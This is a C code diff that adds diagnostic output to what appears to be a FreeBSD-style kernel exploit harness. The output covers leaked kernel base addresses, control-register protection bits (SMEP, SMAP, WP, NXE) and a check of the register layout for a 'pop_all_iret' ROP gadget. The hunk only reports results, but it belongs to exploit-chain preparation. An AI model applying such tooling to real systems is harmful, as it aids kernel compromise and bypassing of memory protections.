@@ -297,6 +297,74 @@ static void _kldload(void* data, size_t data_size)
         }
 
         printf("=== END GADGET READER ===\n");
+    } else if (magic == 0x43505250) { /* "CPRP" - chain preparation results */
+        uint32_t overall = (uint32_t)(readback[0] >> 32);
+        uint32_t t1 = (uint32_t)(readback[8] & 0xFFFFFFFF);
+        uint32_t t2 = (uint32_t)(readback[8] >> 32);
+
+        printf("\n=== CHAIN PREP RESULTS ===\n");
+        printf("  overall_status: %u\n", overall);
+        printf("  kdata_base:     %#lx\n", readback[1]);
+        printf("  ktext_base:     %#lx\n", readback[2]);
+
+        printf("\n  --- System Registers (Test 1: %s) ---\n",
+               t1 == 1 ? "PASS" : t1 == 0xAAAA ? "CRASHED" : "not reached");
+        printf("  EFER:     %#018lx\n", readback[3]);
+        printf("  CR0:      %#018lx\n", readback[4]);
+        printf("  CR4:      %#018lx\n", readback[5]);
+        uint16_t cs = (uint16_t)(readback[6] & 0xFFFF);
+        uint16_t ss = (uint16_t)((readback[6] >> 16) & 0xFFFF);
+        printf("  CS:       %#06x\n", cs);
+        printf("  SS:       %#06x\n", ss);
+        printf("  RFLAGS:   %#018lx\n", readback[7]);
+
+        /* Decode key control register bits */
+        uint64_t efer = readback[3];
+        uint64_t cr0 = readback[4];
+        uint64_t cr4 = readback[5];
+        printf("\n  CR0 flags: WP=%lu\n", (cr0 >> 16) & 1);
+        printf("  CR4 flags: SMEP=%lu SMAP=%lu\n", (cr4 >> 20) & 1, (cr4 >> 21) & 1);
+        printf("  EFER flags: NXE=%lu SCE=%lu LMA=%lu\n",
+               (efer >> 11) & 1, efer & 1, (efer >> 10) & 1);
+
+        printf("\n  pop_all_iret @: %#lx\n", readback[9]);
+
+        printf("\n  --- pop_all_iret Probe (Test 2: %s) ---\n",
+               t2 == 1 ? "PASS" : t2 == 0xAAAA ? "CRASHED" : "not reached");
+
+        if (t2 == 1) {
+            static const char* rnames[] = {
+                "RDI", "RSI", "RDX", "RCX", "R8 ", "R9 ", "RAX", "RBX",
+                "RBP", "R10", "R11", "R12", "R13", "R14", "R15"
+            };
+            /* Expected markers: 0xD1..01 through 0xDF..0F */
+            printf("  Register captures (marker = pop slot):\n");
+            int match_count = 0;
+            for (int i = 0; i < 15; i++) {
+                uint64_t val = readback[10 + i];
+                uint8_t slot = (uint8_t)(val & 0xFF);
+                uint8_t hi = (uint8_t)(val >> 56);
+                int is_marker = (hi >= 0xD1 && hi <= 0xDF);
+                const char* note = "";
+                if (is_marker && slot == (i + 1))
+                    { note = " OK (expected)"; match_count++; }
+                else if (is_marker)
+                    note = " WRONG SLOT";
+                else if ((val >> 56) == 0xEE)
+                    note = " (skip marker - layout mismatch!)";
+                else if ((val >> 56) == 0xAA || (val >> 56) == 0xBB ||
+                         (val >> 56) == 0xCC || (val >> 56) == 0xDD)
+                    note = " (skip/err marker - layout mismatch!)";
+                printf("    %s: %#018lx%s\n", rnames[i], val, note);
+            }
+            printf("\n  Layout match: %d/15 registers correct\n", match_count);
+            if (match_count == 15)
+                printf("  pop_all_iret layout CONFIRMED - standard FreeBSD!\n");
+            else
+                printf("  Layout DIFFERS from standard - adjust SKIP_BYTES\n");
+        }
+
+        printf("\n=== END CHAIN PREP ===\n");
     } else {
         /* Generic readback - check for test markers */
         uint64_t val0 = readback[0];
